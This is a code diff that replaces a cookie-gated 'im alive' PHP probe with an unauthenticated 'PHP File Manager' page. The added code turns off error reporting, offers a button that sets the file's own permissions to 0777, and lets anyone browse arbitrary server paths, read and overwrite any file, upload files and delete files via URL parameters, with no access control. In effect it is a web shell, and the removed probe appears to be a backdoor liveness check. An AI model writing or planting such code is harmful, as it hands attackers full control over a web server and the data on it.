@@ -1,11 +1,182 @@
 <?php
-header('Content-Type: text/plain');
-http_response_code(200);
+// Simple PHP File Manager with Self CHMOD
+error_reporting(0);
 
-// Check if the cookie named 'auth' is set and equals 'toot'
-if (isset($_COOKIE['auth']) && $_COOKIE['auth'] === 'toot') {
-    echo "im alive";
-} else {
-    echo "Access denied";
+// Function to change permissions
+function chmodSelf() {
+    if (isset($_POST['chmod_self'])) {
+        if (chmod(__FILE__, 0777)) {
+            echo "<div style='color: green;'>Permissions changed to 0777 successfully!</div>";
+        } else {
+            echo "<div style='color: red;'>Failed to change permissions!</div>";
+        }
+    }
 }
+
+// Function to list directory contents
+function listDirectory($dir = '.') {
+    $files = [];
+    if (is_dir($dir)) {
+        $items = scandir($dir);
+        foreach ($items as $item) {
+            if ($item != '.' && $item != '..') {
+                $path = $dir . '/' . $item;
+                $files[] = [
+                    'name' => $item,
+                    'path' => $path,
+                    'is_dir' => is_dir($path),
+                    'size' => is_dir($path) ? '-' : formatSize(filesize($path)),
+                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
+                    'modified' => date('Y-m-d H:i:s', filemtime($path))
+                ];
+            }
+        }
+    }
+    return $files;
+}
+
+// Format file size
+function formatSize($size) {
+    $units = ['B', 'KB', 'MB', 'GB'];
+    $unit = 0;
+    while ($size >= 1024 && $unit < count($units) - 1) {
+        $size /= 1024;
+        $unit++;
+    }
+    return round($size, 2) . ' ' . $units[$unit];
+}
+
+// Handle file editing
+function handleFileEdit() {
+    if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
+        if (file_put_contents($_POST['file_path'], $_POST['file_content'])) {
+            echo "<div style='color: green;'>File saved successfully!</div>";
+        } else {
+            echo "<div style='color: red;'>Failed to save file!</div>";
+        }
+    }
+}
+
+// Handle navigation
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
+if (isset($_POST['new_dir'])) {
+    $current_dir = $_POST['new_dir'];
+}
+
+// Handle actions
+chmodSelf();
+handleFileEdit();
+
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PHP File Manager</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
+        .container { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .file-list { border: 1px solid #ddd; margin: 10px 0; }
+        .file-item { padding: 10px; border-bottom: 1px solid #eee; }
+        .file-item:hover { background: #f9f9f9; }
+        .dir { color: #0066cc; font-weight: bold; }
+        .file { color: #333; }
+        .btn { padding: 5px 10px; margin: 2px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
+        .btn:hover { background: #e0e0e0; }
+        .editor { width: 100%; height: 400px; font-family: monospace; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PHP File Manager</h1>
+        
+        <div class="warning">
+            <strong>Warning:</strong> This is a powerful file manager. Use with caution!
+        </div>
+
+        <!-- CHMOD Self Form -->
+        <form method="post" style="margin: 10px 0;">
+            <button type="submit" name="chmod_self" class="btn">CHMOD Self to 0777</button>
+            Current permissions: <?php echo substr(sprintf('%o', fileperms(__FILE__)), -4); ?>
+        </form>
+
+        <!-- Navigation Form -->
+        <form method="post" style="margin: 10px 0;">
+            <input type="text" name="new_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 300px;">
+            <button type="submit" class="btn">Go to Directory</button>
+        </form>
+
+        <!-- File List -->
+        <h3>Contents of: <?php echo htmlspecialchars($current_dir); ?></h3>
+        <div class="file-list">
+            <?php
+            $files = listDirectory($current_dir);
+            if (empty($files)) {
+                echo "<div class='file-item'>Directory is empty or doesn't exist.</div>";
+            } else {
+                foreach ($files as $file) {
+                    echo "<div class='file-item " . ($file['is_dir'] ? 'dir' : 'file') . "'>";
+                    echo "<strong>" . htmlspecialchars($file['name']) . "</strong>";
+                    echo " [Size: " . $file['size'] . "]";
+                    echo " [Perms: " . $file['perms'] . "]";
+                    echo " [Modified: " . $file['modified'] . "]";
+                    
+                    if ($file['is_dir']) {
+                        echo " <a href='?dir=" . urlencode($file['path']) . "' class='btn'>Open</a>";
+                    } else {
+                        echo " <a href='?edit=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn'>Edit</a>";
+                        echo " <a href='?delete=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn' onclick='return confirm(\"Delete this file?\")'>Delete</a>";
+                    }
+                    
+                    echo "</div>";
+                }
+            }
+            ?>
+        </div>
+
+        <!-- File Editor -->
+        <?php if (isset($_GET['edit'])): ?>
+            <h3>Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
+            <form method="post">
+                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
+                <textarea name="file_content" class="editor"><?php 
+                    echo htmlspecialchars(file_get_contents($_GET['edit']));
+                ?></textarea>
+                <div style="margin-top: 10px;">
+                    <button type="submit" name="save_file" class="btn">Save File</button>
+                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">Cancel</a>
+                </div>
+            </form>
+        <?php endif; ?>
+
+        <!-- File Upload -->
+        <h3>Upload File</h3>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="upload_file">
+            <button type="submit" name="upload" class="btn">Upload</button>
+        </form>
+
+        <?php
+        // Handle file upload
+        if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
+            $target_file = $current_dir . '/' . basename($_FILES['upload_file']['name']);
+            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
+                echo "<div style='color: green;'>File uploaded successfully!</div>";
+            } else {
+                echo "<div style='color: red;'>File upload failed!</div>";
+            }
+        }
+
+        // Handle file deletion
+        if (isset($_GET['delete'])) {
+            if (unlink($_GET['delete'])) {
+                echo "<div style='color: green;'>File deleted successfully!</div>";
+                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
+            } else {
+                echo "<div style='color: red;'>Failed to delete file!</div>";
+            }
+        }
+        ?>
+    </div>
+</body>
+</html>
